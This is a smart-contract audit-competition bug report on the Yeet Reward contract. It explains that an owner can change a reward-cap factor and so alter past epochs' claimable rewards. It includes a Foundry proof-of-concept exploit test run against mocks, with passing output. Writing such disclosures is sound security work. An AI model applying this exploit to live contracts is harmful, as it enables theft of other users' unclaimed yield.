# #41377 \[SC-Low] Retroactive Reward Cap Manipulation Allows Theft/Loss of Unclaimed Yield

**Submitted on Mar 14th 2025 at 13:31:47 UTC by @DSbeX for** [**Audit Comp | Yeet**](https://immunefi.com/audit-competition/audit-comp-yeet)

* **Report ID:** #41377
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-yeet/blob/main/src/Reward.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  * Contract fails to deliver promised returns, but doesn't lose value
  * Theft of unclaimed yield

## Description

## Brief/Intro

The Reward contract calculates user rewards for past epochs using the current MAX\_CAP\_PER\_WALLET\_PER\_EPOCH\_FACTOR value instead of the historical value active during those epochs. This allows the contract owner to retroactively alter reward caps, enabling theft of unclaimed yield by increasing/decreasing their own (or others) claimable rewards for past epochs beyond originally intended limits.

## Vulnerability Details

The `getClaimableAmount` function in `Reward.sol` dynamically fetches `MAX_CAP_PER_WALLET_PER_EPOCH_FACTOR` from `RewardSettings` when calculating rewards for any epoch. Since the owner can change this value at any time, recalculations for past epochs use the new cap instead of the original.

```javascript
function getClaimableAmount(address user) public view returns (uint256) {
        for (uint256 epoch = lastClaimedForEpoch[user] + 1; epoch < currentEpoch; epoch++) {
            //Uses current MAX_CAP value for historical(previous) epochs
            uint256 maxClaimable = (epochRewards[epoch] / rewardsSettings.MAX_CAP_PER_WALLET_PER_EPOCH_FACTOR());
    }
}
```

The Exploit scenario:

1. Epoch 1:\
   MAX\_CAP\_FACTOR = 30 -> Users can claim up to 1/30 of epoch rewards.\
   Owner contributes 100% of epoch volume
2. Epoch 2:\
   Owner changes MAX\_CAP\_FACTOR to 10
3. Result:\
   Owner's claimable rewards for Epoch 1 increase by 3x(from 1/30 -> 1/10 of rewards).

## Impact Details

Theft of unclaimed yield: Owners can siphon unclaimed rewards from past epochs by retroactively loosening caps.\
Contract fails to deliver promised returns: Users who claimed rewards under original caps receive less than those who claim after changes.\
Loss Example:\
If epochRewards = 187,544 and MAX\_CAP\_FACTOR changes from 30 to 10.\
Loss per Epoch: 187,544 \* (1/10 - 1/30) = 12, 503

## References

Flawed reward calculation logic.\
<https://github.com/immunefi-team/audit-comp-yeet/blob/da15231cdefd8f385fcdb85c27258b5f0d0cc270/src/Reward.sol#L187\\>
Owner-controlled cap adjustment. (41-51 Line)\
<https://github.com/immunefi-team/audit-comp-yeet/blob/da15231cdefd8f385fcdb85c27258b5f0d0cc270/src/RewardSettings.sol#L51>

## Proof of Concept

## Proof of Concept

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/Reward.sol";
import "../src/RewardSettings.sol";
import "./mocks/MockERC20.sol";

contract RewardExploit_Test is Test {
    Reward private reward;
    MockERC20 private token;
    RewardSettings private settings;
    address private owner = address(0x1);
    address private attacker = address(0x2);

    function setUp() public {
        token = new MockERC20("TEST", "TEST", 18);
        settings = new RewardSettings();
        settings.setYeetRewardsSettings(30); // Initial cap: 1/30
        reward = new Reward(token, settings);
        reward.setYeetContract(address(this));
        token.mint(address(reward), 1_000_000 ether);
    }

    function test_retroactive_cap_exploit() public {
        // Epoch 1: Attacker contributes 100% of volume
        reward.addYeetVolume(attacker, 1000 ether);
        skip(1 days + 1);
        reward.addYeetVolume(address(0xBB), 1); //Trigger epoch end
        
        // Verify initial claimable (1/30 cap)
        uint256 epoch1Rewards = reward.epochRewards(1);
        uint256 initialClaim = epoch1Rewards / 30;
        assertEq(reward.getClaimableAmount(attacker), initialClaim);

        // Changing cap to 10 (1/10)
        settings.setYeetRewardsSettings(10);

        // Attacker claims with new cap (3x more)
        uint256 stolenAmount = epoch1Rewards / 10;
        vm.prank(attacker);
        reward.claim();

        // Verify theft
        assertEq(token.balanceOf(attacker), stolenAmount);
    }
}
```

The output:

```javascript
dsbex@DESKTOP-RKI8K0N:~/projects/immunefi/yeet/audit-comp-yeet$ forge test --mt test_retroactive_cap_exploit
[⠊] Compiling...
[⠊] Compiling 1 files with Solc 0.8.28
[⠒] Solc 0.8.28 finished in 867.81ms
Compiler run successful!

Ran 1 test for test/Rewards.Test.sol:RewardExploit_Test
[PASS] test_retroactive_cap_exploit() (gas: 252484)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.39ms (340.34µs CPU time)

Ran 1 test suite in 13.32ms (1.39ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
